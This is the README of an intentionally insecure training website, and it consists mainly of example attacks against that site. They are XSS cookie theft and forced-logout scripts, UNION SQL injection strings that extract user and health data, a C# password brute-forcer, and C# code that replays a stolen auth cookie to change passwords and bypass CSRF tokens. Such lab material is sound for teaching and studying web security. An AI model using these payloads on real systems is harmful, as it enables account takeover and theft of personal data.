# Insecure Website
An intentionally insecure website to play around with and learn web security best practices.

## Example exploits

### XSS and CSRF (rendered on victims website, cookie is retrieved and sent to the attacker)

````javascript
<script>cookieStore.get('.AspNetCore.Cookies').then((r) => {
    var url = "https://hackmecashiesapp.azurewebsites.net/Messenger/SendMessage";
    var xhr = new XMLHttpRequest();
    xhr.open('POST', url, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('OtherUser=qwe&Message=' + r.value);
});</script>
````

### XSS (force logout)

````javascript
<script>cookieStore.delete('.AspNetCore.Cookies'); location.reload();</script>
````

### XSS (send message as another user)

````javascript
<script>document.SendMessageForm.OtherUser.value = "qwe";document.SendMessageForm.Message.value = "a message that was actually sent from someone else";document.SendMessageForm.submit()</script>
````

### SQL Injection (discovery of tables, retrieving sensitive info)

- `' or 1=0) union select TABLE_NAME, DoesntMatter1 = '', DoesntMatter2 = '' from information_schema.tables where table_type = 'base table'--`
- `' or 1=0) union select COLUMN_NAME, DoesntMatter1 = '', DoesntMatter2 = '' from information_schema.columns where table_name = 'User'--  `
- `' or 1=0) union select Username, DoesntMatter1 = '', DoesntMatter2 = '' from [User]--`
- `' or 1=0) union select Username, cast(DateOfBirth as varchar), HealthIdentifier from [User]--`

### Brute force password (very basic, just expecting 3 character long passwords)

````csharp
var chars = "abcdefghijklmnopqrstuvwxyz";
var httpClientHandler = new HttpClientHandler();
httpClientHandler.ServerCertificateCustomValidationCallback = (message, certificate2, arg3, arg4) => true; // for local website
var httpClient = new HttpClient(httpClientHandler);

for (int i = 0; i < chars.Length; i++)
{
    for (int j = 0; j < chars.Length; j++)
    {
        for (int k = 0; k < chars.Length; k++)
        {
            var password = $"{chars[i]}{chars[j]}{chars[k]}".Dump();
            var input = new Dictionary<string, string>()
            {
                {"Username", "qwe"},
                {"Password", password}
            };

            var requestContent = new FormUrlEncodedContent(input);
            var response = await httpClient.PostAsync("https://localhost:7132/Account/Login", requestContent);
            var responseContent = await response.Content.ReadAsStringAsync();
            if (responseContent.Contains("and welcome to your profile"))
            {
                $"Success! found password: {password}".Dump();
            }
        }
    }
}
````

### Perform 'change password' as user programatically (once auth cookie has been retrieved)

````csharp
var authCookie = "";
var domain = "";
var httpClientHandler = new HttpClientHandler();
var cookie = new Cookie(".AspNetCore.Cookies", authCookie, "/", domain);
httpClientHandler.CookieContainer.Add(cookie);
var httpClient = new HttpClient(httpClientHandler);

// Change password
var input = new Dictionary<string, string>()
{
   {"Password", "random"}
};
var requestContent = new FormUrlEncodedContent(input);
var response = await httpClient.PostAsync($"https://{domain}/Profile/ChangePassword", requestContent);
var responseContent = await response.Content.ReadAsStringAsync();
responseContent.Dump();
response.Dump();
````

### Perform 'public board send message' as user programatically (once auth cookie has been retrieved, and even though it has CSRF protection)

````csharp
var authCookie = "";
var domain = "";
var httpClientHandler = new HttpClientHandler();
var cookie = new Cookie(".AspNetCore.Cookies", authCookie, "/", domain);
httpClientHandler.CookieContainer.Add(cookie);
var httpClient = new HttpClient(httpClientHandler);

// Post on public board, need to parse out anti forgery token for form
var publicBoardResponse = await httpClient.GetAsync($"https://{domain}/PublicBoard");
var publicBoardContent = await publicBoardResponse.Content.ReadAsStringAsync();
var startString = "__RequestVerificationToken\" type=\"hidden\" value=\"";
var start = publicBoardContent.IndexOf(startString) + startString.Length;
var end = publicBoardContent.IndexOf("\" />", start);
var formAntiForgeryToken = publicBoardContent.Substring(start, end - start).Dump();

// Should be included automatically as part of the handlers cookie store
//var antiforgeryCookie = publicBoardResponse.Headers.Single(x => x.Key == "Set-Cookie").Value.Single(x => x.StartsWith(".AspNetCore.Antifo"));

var input = new Dictionary<string, string>()
{
    {"Message", "random messsage after i stole an auth cookie"},
    {"__RequestVerificationToken", formAntiForgeryToken}
};

var requestContent = new FormUrlEncodedContent(input);
var response = await httpClient.PostAsync($"https://{domain}/PublicBoard/SendMessage", requestContent);
var responseContent = await response.Content.ReadAsStringAsync();
responseContent.Dump();
response.Dump();
````
